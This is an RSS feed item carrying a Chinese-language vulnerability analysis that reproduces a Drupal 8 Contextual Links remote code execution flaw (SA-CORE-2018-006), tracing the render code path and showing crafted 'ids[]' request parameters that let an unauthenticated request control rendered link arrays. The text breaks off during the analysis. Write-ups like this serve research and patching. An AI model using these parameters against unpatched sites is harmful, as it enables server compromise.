<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Sat, 17 Nov 2018 15:51:45 +0800</lastBuildDate>
<item>
<title>Drupal Contextual Link RCE</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-11-13-49558602.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/49558602&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-085bfea8e95a519fcf22af1bf24c3c58_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;0x00 参考链接&lt;/b&gt;&lt;br&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;官方预警：https://www.drupal.org/sa-core-2018-006&lt;/li&gt;&lt;li&gt;commit：&lt;br&gt;https://github.com/drupal/drupal/commit/c8f0c39ca488cc29ed575b61c0acf45845d8efed#diff-483e0dea92d8d5caf8024c4a621b9ef5R374&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x01 前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;10 月 17 日，Drupal 官方发布安全更新 SA-CORE-2018-006 ，修复了 5 个安全漏洞，其中包括 2 个高危漏洞和 3 个中危漏洞。其中 2 个高危漏洞为远程代码执行漏洞。&lt;/p&gt;&lt;p&gt;这里对其中 Drupal 8 Contextual Links 验证问题导致远程代码执行的漏洞进行复现。&lt;/p&gt;&lt;p&gt;根据官方漏洞简要说明得知该漏洞首先需要拥有 &lt;code class=&quot;inline&quot;&gt;Contextual Links&lt;/code&gt; 模块的权限，并且由于对请求的links缺乏很好的验证导致了rce。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a0426c2fd871d4824827873c891fd8a5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;742&quot; data-rawheight=&quot;140&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-a0426c2fd871d4824827873c891fd8a5&quot; data-watermark-src=&quot;v2-7f1a123e4c8c3942c9ef4542f1e859d4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;查看commit内容，怀疑如下内容为漏洞入口&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cd7c622c24320d6cc8f33f3d1c7ed53c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;910&quot; data-rawheight=&quot;411&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-cd7c622c24320d6cc8f33f3d1c7ed53c&quot; data-watermark-src=&quot;v2-51f5cfb9ca6a743ab2d19fb4b69f96d1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x02 环境搭建&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通过如下命令搭建好drupal 8.5.2版本。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f0ff97c72bd86f6c9a175925788b3379_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;740&quot; data-rawheight=&quot;96&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据权限要求登录管理账号添加 &lt;code class=&quot;inline&quot;&gt;Contextual Links&lt;/code&gt; 模块权限，之后退出账号。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8a7bbbfb5dcbaef803695abbfcef0bf4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;216&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8a7bbbfb5dcbaef803695abbfcef0bf4&quot; data-watermark-src=&quot;v2-26bf5c19825ea1840541ef1de1da58f0&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x03 过程调试&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;配置好代理burpsuite后，访问主页可抓取到如下请求。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-51a0afe19e419624b13b068f7b0b32e3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;261&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-51a0afe19e419624b13b068f7b0b32e3&quot; data-watermark-src=&quot;v2-770d354a77fd778810b3e8cf8a650203&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在 &lt;code class=&quot;inline&quot;&gt;core/modules/contextual/src/ContextualController.php&lt;/code&gt; 的 &lt;code class=&quot;inline&quot;&gt;render&lt;/code&gt; 函数中挂上断点，并只保留如下 &lt;code class=&quot;inline&quot;&gt;ids&lt;/code&gt; 内容: &lt;code class=&quot;inline&quot;&gt;ids[]=block:block=bartik_footer:langcode=en|menu:menu=footer:langcode=en&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7c09bf036b5b4f2c121446ab57988e37_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;221&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7c09bf036b5b4f2c121446ab57988e37&quot; data-watermark-src=&quot;v2-de0afdabab8dc90164cce52754593f96&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-61ee58b4efa50280708fcccbf8a1b207_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;894&quot; data-rawheight=&quot;413&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-61ee58b4efa50280708fcccbf8a1b207&quot; data-watermark-src=&quot;v2-557a9f57668a43830e2e923519afa306&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;#contextual_links&lt;/code&gt; 将会通过 &lt;code class=&quot;inline&quot;&gt;_contextual_id_to_links($id)&lt;/code&gt; 函数获取 ，函数内容如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-98b34a76135bfb7c962c84d25bb2efc0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;745&quot; data-rawheight=&quot;364&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-98b34a76135bfb7c962c84d25bb2efc0&quot; data-watermark-src=&quot;v2-3ac6c313068bac49440b1b85fb23f7fa&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;该函数将会将 &lt;code class=&quot;inline&quot;&gt;$id&lt;/code&gt; 的内容通过 &lt;code class=&quot;inline&quot;&gt;|&lt;/code&gt; 拆分，并通过 &lt;code class=&quot;inline&quot;&gt;:&lt;/code&gt; 分割至变量 &lt;code class=&quot;inline&quot;&gt;$group&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;$route_parameters_raw&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;$metadata_raw&lt;/code&gt;，之后 &lt;code class=&quot;inline&quot;&gt;$route_parameters_raw&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;$metadata_raw&lt;/code&gt; 将会经过 &lt;code class=&quot;inline&quot;&gt;parse_str&lt;/code&gt; 解析成变量，并最终赋值给 &lt;code class=&quot;inline&quot;&gt;$contextual_links[$group]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-48e63b62b5c9d827e9657ac45808cd60_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;330&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-48e63b62b5c9d827e9657ac45808cd60&quot; data-watermark-src=&quot;v2-2c413d66b763bef9d7da9aa7dea988ee&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里将 &lt;code class=&quot;inline&quot;&gt;ids&lt;/code&gt; 内容再缩短至： &lt;code class=&quot;inline&quot;&gt;ids[]=block:block=bartik_footer:langcode=en&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7f1866a5f9bde1ba83cccf673cb6493f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;448&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7f1866a5f9bde1ba83cccf673cb6493f&quot; data-watermark-src=&quot;v2-98b330ec5daabc2b6da1b5f750b4ea4e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后进入 &lt;code class=&quot;inline&quot;&gt;renderRoot&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-9fc7cca3f5e686f79a884dbf60f42da6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;299&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9fc7cca3f5e686f79a884dbf60f42da6&quot; data-watermark-src=&quot;v2-0cdbe5e12f867917fee84473e3896677&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;继续跟进 &lt;code class=&quot;inline&quot;&gt;executeInRenderContext&lt;/code&gt; 函数，其中将 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;render($elements, TRUE)&lt;/code&gt; 作为回调函数&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2c4151fa493536aceec3edcd18d0f249_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;252&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-2c4151fa493536aceec3edcd18d0f249&quot; data-watermark-src=&quot;v2-f2aa2f87355d001ad2d10613ff1e7c11&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-539e099be7d76f260b91fe2948adfa8d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;317&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-539e099be7d76f260b91fe2948adfa8d&quot; data-watermark-src=&quot;v2-c91d0fc8e4902366f720d1f1ba5d89d7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b76d16a117d891bd21dddfcad62b6b54_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;491&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b76d16a117d891bd21dddfcad62b6b54&quot; data-watermark-src=&quot;v2-9db6383a01f2a5c4f345f6a75032bfd4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;render&lt;/code&gt; 最终将会进入 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-006fa5535b26ee565297f96c069d41e0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;394&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-006fa5535b26ee565297f96c069d41e0&quot; data-watermark-src=&quot;v2-1a02be1d38d88f8d3faf24e2950e4dc4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后经过 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;elementInfo-&amp;gt;getInfo&lt;/code&gt; 函数。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b666a2a8af6952fc6f58f0aee3904cb9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;506&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b666a2a8af6952fc6f58f0aee3904cb9&quot; data-watermark-src=&quot;v2-71d99435a45a1f1e6460ce622e31b277&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里主要是增加一些新属性。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7643e7e8436c89e49441817429525e2b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;904&quot; data-rawheight=&quot;441&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7643e7e8436c89e49441817429525e2b&quot; data-watermark-src=&quot;v2-87422627ee38c0cf71154b6b92fa6bb4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中添加了 &lt;code class=&quot;inline&quot;&gt;#pre_render&lt;/code&gt; 将会进入预处理 &lt;code class=&quot;inline&quot;&gt;preRenderLinks&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b80c79f4f151cd2325aaaa12d583e248_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;325&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b80c79f4f151cd2325aaaa12d583e248&quot; data-watermark-src=&quot;v2-4de3a521956c44fb1c27dd47babd8ba1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中跟进 &lt;code class=&quot;inline&quot;&gt;$contextual_links_manager-&amp;gt;getContextualLinksArrayByGroup&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9d4b2098d14198913c07fad81d37f25d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;352&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9d4b2098d14198913c07fad81d37f25d&quot; data-watermark-src=&quot;v2-272a2310ffff608a5021d78609b23317&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这里将会通过 &lt;code class=&quot;inline&quot;&gt;$group_name&lt;/code&gt; 在 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;pluginsByGroup&lt;/code&gt; 进行一个匹配搜索，这里匹配成功进入后续循环体。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-94bc51f97e106afb6891ca8380ae60ec_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;372&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-94bc51f97e106afb6891ca8380ae60ec&quot; data-watermark-src=&quot;v2-643c7396fc0a7b6f3cfbadd3c6627290&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-81205008b4b1c6258d736c80947a0751_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;587&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-81205008b4b1c6258d736c80947a0751&quot; data-watermark-src=&quot;v2-49a4fea1ba22333ca5a3e4c3ca07aedc&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;但是这里由于并没有登录，所有没有访问权限跳出循环体，导致 &lt;code class=&quot;inline&quot;&gt;links&lt;/code&gt; 变量为空。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0aaefc2cdeb051d558612aef6683590d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;447&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0aaefc2cdeb051d558612aef6683590d&quot; data-watermark-src=&quot;v2-310b25bdca0b92c4ea026961f54d6eba&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;从而 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 也为空，之后进入 &lt;code class=&quot;inline&quot;&gt;alter&lt;/code&gt;，这里函数内容过程，主要关注最后的 &lt;code class=&quot;inline&quot;&gt;$function($data, $context1, $context2);&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c3fd7481781a8021849acbb80c581ec8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;902&quot; data-rawheight=&quot;332&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c3fd7481781a8021849acbb80c581ec8&quot; data-watermark-src=&quot;v2-c8811ecc8f05c423927d2756b7d9af93&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e33c302300ecd54aba332aa92d5c2602_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;250&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e33c302300ecd54aba332aa92d5c2602&quot; data-watermark-src=&quot;v2-f1299a890a4e610d497ff40565a08337&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;将会依次调用 &lt;code class=&quot;inline&quot;&gt;contextual_contextual_links_view_alter&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;views_ui_contextual_links_view_alter&lt;/code&gt;&lt;/p&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;contextual_contextual_links_view_alter&lt;/code&gt; 代码如下：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-30f09a6c7e861a545681f01d7398ec29_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;409&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-30f09a6c7e861a545681f01d7398ec29&quot; data-watermark-src=&quot;v2-e0ab7b28ced7ef06cf7ac9c6f8509f48&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可以看到，当存在 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;])&lt;/code&gt; 时，将会将 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;][&#39;metadata&#39;][&#39;contextual-views-field-links&#39;]&lt;/code&gt; 内容赋值给 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt;，这由于我们的 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;])&lt;/code&gt; 没有设置，所以 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 依旧为空，但是这部分我们是可控的。&lt;/p&gt;&lt;p&gt;之后执行完函数回到之前时，由于 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 为空，则设置 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#printed&#39;] = TRUE;&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-31e99a95c39157a718a7383b385c7ac8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;576&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-31e99a95c39157a718a7383b385c7ac8&quot; data-watermark-src=&quot;v2-ffcd2886812efb2690958338c955b6fc&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这将导致返回空字符串内容。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-63fc64a0f3c22237b012df8e2ace1fdf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;599&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-63fc64a0f3c22237b012df8e2ace1fdf&quot; data-watermark-src=&quot;v2-551ebfa498b36e10a81fbca750fba619&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-94dd1d915ccdeb1ca4c12bb7c8cc29c8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;245&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-94dd1d915ccdeb1ca4c12bb7c8cc29c8&quot; data-watermark-src=&quot;v2-6fe071a378a0a026a83cd6b695133371&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x04 控制 $element[&#39;#links&#39;] 变量&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以我们可通过设置 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;])&lt;/code&gt; 以及 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;][&#39;metadata&#39;][&#39;contextual-views-field-links&#39;]&lt;/code&gt; 来确保 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 不为空。&lt;/p&gt;&lt;p&gt;对照 &lt;code class=&quot;inline&quot;&gt;#contextual_links&lt;/code&gt; 中的变量进行修改，并且 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#contextual_links&#39;][&#39;contextual&#39;][&#39;metadata&#39;][&#39;contextual-views-field-links&#39;]&lt;/code&gt; 需要为 &lt;code class=&quot;inline&quot;&gt;json&lt;/code&gt; 格式，并且由于会通过 &lt;code class=&quot;inline&quot;&gt;:&lt;/code&gt; 进行拆分所以 &lt;code class=&quot;inline&quot;&gt;:&lt;/code&gt; 需要进行二次编码。&lt;/p&gt;&lt;p&gt;得到 &lt;code class=&quot;inline&quot;&gt;ids[]=contextual:block=bartik_footer:contextual-views-field-links={&quot;aaa&quot; %253A &quot;bbb&quot;}&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6dd56786b321bf1661dc917761fa39e3_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;744&quot; data-rawheight=&quot;100&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;成功设置 &lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-ee2a0438c59f4f448cb4ff050df9f85c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;387&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-ee2a0438c59f4f448cb4ff050df9f85c&quot; data-watermark-src=&quot;v2-288ec0865dc69bd96627867e8f5aaff4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x05 寻找漏洞触发点&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$element[&#39;#links&#39;]&lt;/code&gt; 虽然可控但是距离触发漏洞还有一定的距离，继续在 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数中查找漏洞触发点。&lt;/p&gt;&lt;p&gt;调试过之前drupal drupalgeddon漏洞的同学应该会知道，如果对 &lt;code class=&quot;inline&quot;&gt;$elements&lt;/code&gt; 数组变量可控，可通过设置 &lt;code class=&quot;inline&quot;&gt;$elements[&#39;#pre_render&#39;]&lt;/code&gt; 来触发 &lt;code class=&quot;inline&quot;&gt;call_user_func&lt;/code&gt; 来达到RCE的目的，这里严重怀疑该漏洞也是通过该种方法得以触发。&lt;/p&gt;&lt;p&gt;继续调试，跟进 &lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;theme-&amp;gt;render&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-06a56ad7932c30744a56c618362e6f18_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;479&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-06a56ad7932c30744a56c618362e6f18&quot; data-watermark-src=&quot;v2-679e160b056abd16291678cc353bbaf3&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;经过一系列繁琐的操作后将会依次调用如下函数，其中 &lt;code class=&quot;inline&quot;&gt;$variables[links]&lt;/code&gt; 为我们所控。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-35a4c6c1f69ebc637544fd12a847ea3d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-35a4c6c1f69ebc637544fd12a847ea3d&quot; data-watermark-src=&quot;v2-f6cdba1ec2a8642bed65195701bca4dc&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;跟进其中的 &lt;code class=&quot;inline&quot;&gt;template_preprocess_links&lt;/code&gt; 函数，部分内容如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d66f2e40123f6fa5b245403f94ad5f77_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;795&quot; data-rawheight=&quot;935&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d66f2e40123f6fa5b245403f94ad5f77&quot; data-watermark-src=&quot;v2-cbbb9a85ebb50ddc4f8a361566d1a7bd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;$link_element&lt;/code&gt; 将通过 &lt;code class=&quot;inline&quot;&gt;$link&lt;/code&gt; 变量进行设置，可以看到我们可控制其中的 &lt;code class=&quot;inline&quot;&gt;#title&lt;/code&gt;，&lt;code class=&quot;inline&quot;&gt;#options&lt;/code&gt;，&lt;code class=&quot;inline&quot;&gt;#url&lt;/code&gt; 以及 &lt;code class=&quot;inline&quot;&gt;#ajax&lt;/code&gt; 变量，这里由于传递的为 &lt;code class=&quot;inline&quot;&gt;{&quot;aaa&quot;:&quot;bbb&quot;}&lt;/code&gt; ，所以 &lt;code class=&quot;inline&quot;&gt;&quot;bbb&quot;&lt;/code&gt; 不为数组导致报错。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-0e1b7dd67bcb506273b25b1c7c0b639e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;519&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0e1b7dd67bcb506273b25b1c7c0b639e&quot; data-watermark-src=&quot;v2-167a79f31729198a7e347ba20867f092&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;修改一下传递参数 &lt;code class=&quot;inline&quot;&gt;contextual-views-field-links&lt;/code&gt; 内容：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f10d0d25f7f4f0db48c296362615f3b6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;853&quot; data-rawheight=&quot;30&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;成功设置 &lt;code class=&quot;inline&quot;&gt;$link_element&lt;/code&gt; 变量。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4abafaeccfa0bc7f5def4747e406a543_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;893&quot; data-rawheight=&quot;485&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4abafaeccfa0bc7f5def4747e406a543&quot; data-watermark-src=&quot;v2-7865eaca0977e37f94350166fc8fa54f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0d4bed8a9dd97e0cf050fb616bbcbffb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;900&quot; data-rawheight=&quot;451&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0d4bed8a9dd97e0cf050fb616bbcbffb&quot; data-watermark-src=&quot;v2-050ae32875c67b5206b3d8e856b5717b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最后设置给了 &lt;code class=&quot;inline&quot;&gt;$variables[&#39;links&#39;]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f04b6ad790b32f3dcc671db4d883b0e6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;468&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f04b6ad790b32f3dcc671db4d883b0e6&quot; data-watermark-src=&quot;v2-c3598c57e67f14747fbce9a55b3046a9&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最终进入页面render过程。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e953e65a6f6e32f72f237199ea53183f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;522&quot; data-watermark=&quot;watermark&quot; 